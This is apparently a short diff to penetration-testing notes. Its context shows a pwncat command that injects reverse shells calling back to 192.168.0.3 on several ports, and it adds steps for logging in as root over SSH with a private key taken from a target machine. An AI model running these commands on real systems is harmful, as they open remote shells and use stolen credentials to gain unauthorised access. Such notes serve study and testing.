@@ -28,3 +28,11 @@ pwncat -l 1234 --self-inject /bin/sh:192.168.0.3:1234+3
 The above command creates 4 reverse shells on the machines at port 1235,1236,1237,1234
 
 ```
+
+Sometimes we may gain remote machine ssh secret utilizing it we may be able to get access to it.
+
+```
+1) Download the id_rsa to local machine.
+2) chmod 600 id_rsa
+3) ssh -i id_rsa root@192.169.0.3
+```
